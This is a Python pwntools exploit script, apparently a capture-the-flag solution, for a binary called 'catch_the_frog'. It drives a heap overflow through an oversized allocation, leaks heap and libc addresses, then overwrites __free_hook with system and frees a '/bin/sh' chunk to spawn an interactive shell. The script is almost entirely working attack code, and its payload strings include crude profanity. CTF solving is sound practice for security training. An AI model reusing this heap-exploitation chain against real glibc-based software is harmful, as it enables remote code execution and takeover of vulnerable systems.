from pwn import *

context.terminal = ["tmux", "new-window"]
#context.log_level = True

is_remote = False
remote_addr = ['',0]

elf_path = "./catch_the_frog"
libc_path = "libc-2.27.so"

client = process("client")

if is_remote:
    p = remote(remote_addr[0], remote_addr[1])
else:
    p = process(elf_path, aslr = True)

if elf_path:
    elf = ELF(elf_path)
if libc_path:
    libc = ELF(libc_path)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s, addr = None):
    if addr != None:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a = 6):
    if(a == 6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def client_choice(index):
    client.sendlineafter(": ", str(index))

def recv_packet():
    client.recvuntil("size: ")
    size = int(client.recvline())
    client.recvuntil("Content: ")
    packet = client.recv(size)
    sla(": ", str(len(packet)))
    sa(": ", packet)

def alloc(size):
    client_choice(1)
    client_choice(size)
    return recv_packet()

def edit(index, content):
    client_choice(5)
    client_choice(index)
    client_choice(len(content))
    client.sendafter(": ", content)
    return recv_packet()

def show(index):
    client_choice(3)
    client_choice(index)
    return recv_packet()

def free(index):
    client_choice(4)
    client_choice(index)
    return recv_packet()

if __name__ == "__main__":
    alloc(0x10000000000000000-8)
    edit(0, "FUCKME.")
    show(0)
    alloc(0x100)
    edit(1, "FUCKYOU")
    edit(0, "A"*0x20)
    show(0)
    ru("A"* 0x20)
    heap_addr = raddr() + 0x1c0 + 0x50
    lg("Heap", heap_addr)
    for i in range(8):
        alloc(0xf0)
    for i in range(8):
        free(9 - i)

    edit(0, "A"*0x20 + p64(heap_addr))
    show(1)
    ru("from ")
    libc_addr = raddr() - 0x3ebca0
    lg("libc", libc_addr)
    libc.address = libc_addr

    edit(0, "/bin/sh\x00"*3 + p64(0x21) + p64(libc.symbols["__free_hook"]))
    edit(1, p64(libc.symbols["system"]))
    free(0)
    #gdb.attach(p)
    sla(": ", "\n")
    client.close()
    p.interactive()
